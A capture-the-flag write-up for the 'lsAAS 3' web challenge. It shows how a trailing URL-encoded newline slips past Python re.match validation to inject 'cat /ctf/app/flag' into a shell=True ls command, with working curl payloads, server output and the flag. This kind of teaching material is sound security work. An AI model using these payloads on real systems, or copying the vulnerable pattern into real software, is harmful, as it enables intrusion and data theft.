# lsAAS 3

## Write-Up

When accessing the website, we can see that, with a given folder path, it displays its content using `ls` command. We note also that the previous commands injections of `lsAAS 1` and `lsAAS 2` doesn't work and we need a new exploit to get the flag. When trying, we get the following error :

  <br>
  <div class="result"><p style="@import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap'); 
    color:red;
    font-weight: bold;
    position: relative;
    margin: auto;
    font-family: 'Roboto Mono', monospace;">That&#39;s not allowed</p>
  </div>
  <br>

After playing arround with the input, we can find that flag is in `/ctf/app/flag`.

Also, we can see that the `app.py`, the index of the server, is provided in the attachements :


```py
import subprocess
from flask import Flask, request, render_template
from dotenv import load_dotenv
import re

load_dotenv()

app = Flask(__name__)
folder_re = re.compile("^[/0-9A-Za-z_ ]+$")
option_re = re.compile("^(all|human-readable|reverse)$")

@app.route("/", methods=["GET", "POST"])
def index():
    output, error = '', ''
    if request.method == "POST" : 
        folder = request.form.get("folder", "")
        option = request.form.get("option", "")
        try : 
            if folder_re.match(folder) and option_re.match(option):
                output = subprocess.run(f"ls -l --{option} {folder}", shell=True, timeout=2, capture_output=True).stdout.decode()
            else:
                error = "That's not allowed"
        except:
            error = "Something went wrong and I'm too lazy to investigate"
    return render_template("index.html", statement=output, error=error) 

# Error handling

@app.errorhandler(404)
def not_found(e):
    return render_template("404.html"), 404

@app.errorhandler(500)
def server_error(e):
    return render_template("500.html"), 500
```

After analysing it, we can notice that our inputs `option` and `folder` are matched with some `regex` patterns and then added in the `ls` command. So, we can't add any special character to add inject other commands, but it is obvious that the exploit is using a **Command Injection** vulnerabilty, but also, other vulnerabilities.

After doing some research, we can find that the `re.match()` function used has also its own vulnerability : 

 > Using python `re.match()` function to validate a user input can lead to bypass because it will only match at the beginning of the string **and not at the beginning of each line.**

It also matches words and strings even if the re is some new line at the end of it :

```profile
In [3]: re.match('all$', 'all\n')
Out[3]: <re.Match object; span=(0, 3), match='all'>

In [4]: re.match('all$', 'all')
Out[4]: <re.Match object; span=(0, 3), match='all'>

In [5]: re.match('all$', 'all\na')

In [6]: re.match('all$', 'alla')
```


So, by adding a new line to one of the inputs, it won't cause an error and will display the exact command like without the new line :

```
curl 'http://lsaas-3.web-server.challs.ctf.shellmates.club/' -X POST --data "option=all" --data "folder=/ctf/app %0a"
```

**Common mistake :** So, we must use urlencoding the chars to all non printable characters and control characters like new line, don't use it directly `\n`, needs to be `%0a`

```html
<!DOCTYPE html>
<html>
...
  <button type="submit">Submit</button>
  </form>
    <br>
  <br>
  <br>
  <br>
  <br>

  <div class="result">
  <pre id="nom" style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                          color:green;
                        font-weight: bold;
                        position: relative;
                        margin: auto;
                        font-family: 'Roboto Mono', monospace;">
                        total 36
drwxr-xr-x 3 root root 4096 Dec 24 21:45 .
drwxr-xr-x 1 root root 4096 Dec 24 21:45 ..
-rw-rw-r-- 1 root root   24 Dec 24 21:38 .env
-rw-rw-r-- 1 root root  143 Dec 24 21:38 app.ini
-rw-rw-r-- 1 root root 1094 Dec 24 21:38 app.py
-rw-rw-r-- 1 root root   72 Dec 24 21:38 flag
-rw-rw-r-- 1 root root   41 Dec 24 21:38 requirements.txt
drwxrwxr-x 2 root root 4096 Dec 24 21:44 templates
-rw-rw-r-- 1 root root   62 Dec 24 21:38 wsgi.py

  </pre></div>

  <div class="result"><p style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                          color:red;
                        font-weight: bold;
                        position: relative;
                        margin: auto;
                        font-family: 'Roboto Mono', monospace;"></p>
  </div>
</body>

</html>
```

But a command like this won't give us the opportunity to inject new command to read the flag, you can try to add more chars after the new line, it won't match. The strategy is to actually put the new line character in the `option` input, and then inject your command in the `folder` input.

```
curl 'http://lsaas-3.web-server.challs.ctf.shellmates.club/' -X POST --data "option=all%0a" --data "folder=cat /ctf/app/flag" 
```

```html
<!DOCTYPE html>
<html>
...
  <button type="submit">Submit</button>
    </form>
    <br>
        <br>
        <br>
        <br>
        <br>

        <div class="result">
        <pre id="nom" style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:green;
                                                        font-weight: bold;
                                                        position: relative;
                                                        margin: auto;
                                                        font-family: 'Roboto Mono', monospace;">
                                                        total 36
drwxr-xr-x 3 root root 4096 Dec 24 21:45 .
drwxr-xr-x 1 root root 4096 Dec 24 21:45 ..
-rw-rw-r-- 1 root root   24 Dec 24 21:38 .env
-rw-rw-r-- 1 root root  143 Dec 24 21:38 app.ini
-rw-rw-r-- 1 root root 1094 Dec 24 21:38 app.py
-rw-rw-r-- 1 root root   72 Dec 24 21:38 flag
-rw-rw-r-- 1 root root   41 Dec 24 21:38 requirements.txt
drwxrwxr-x 2 root root 4096 Dec 24 21:44 templates
-rw-rw-r-- 1 root root   62 Dec 24 21:38 wsgi.py
shellmates{I_sH0uLD_hAvE_DOcUM3ntED_WelL_AB0UT_PYTH0n_R3gex_BefOR3_Th4t}
        </pre></div>

        <div class="result"><p style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:red;
                                                        font-weight: bold;
                                                        position: relative;
                                                        margin: auto;
                                                        font-family: 'Roboto Mono', monospace;"></p>
        </div>
</body>

</html>
```

**Note :** When adding your new line character, be sure that the rest of the string matches the pattern, otherwire it won't work (One space is enough to fire a mismatch) :


```
curl 'http://lsaas-3.web-server.challs.ctf.shellmates.club/' -X POST --data "option=all %0a" --data "folder=cat /ctf/app/flag" 
```

```html
<!DOCTYPE html>
<html>
...
  <button type="submit">Submit</button>
        </form>
    <br>
        <br>
        <br>
        <br>
        <br>

        <div class="result"><p style="     @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@200;300&family=Roboto+Mono:wght@300&display=swap');
                                color:red;
                                                        font-weight: bold;
                                                        position: relative;
                                                        margin: auto;
                                                        font-family: 'Roboto Mono', monospace;">That&#39;s not allowed</p>
        </div>
</body>

</html>
```

To summarize, adding a new line to a string won't make it mismatch the pattenr, like  `all` or `all\n` do match. This property is commun in most languages that uses `regex` like `php` or `python`. Doesn't occur though in `javascript`.

## Flag

shellmates{I_sH0uLD_hAvE_DOcUM3ntED_WelL_AB0UT_PYTH0n_R3gex_BefOR3_Th4t}

## More Information

 - A Python Regular Expression Bypass Technique For SQL Injections : https://www.secjuice.com/python-re-match-bypass-technique/?fbclid=IwAR3f9kc5j_GN_rkP4HTsGIrFnnOyZQm-ppJKrKfTDiNa0c8H4ncw6Ouy8vs

 - **`%0A`** is URL-encoding of a newline, which you would use in (obviously) URLs. `&x0a;` would be the HTML-encoding of the same character that you would use in HTML, but it doesn't work, for a variety of reasons. To break a line in HTML, you can use <br> tag.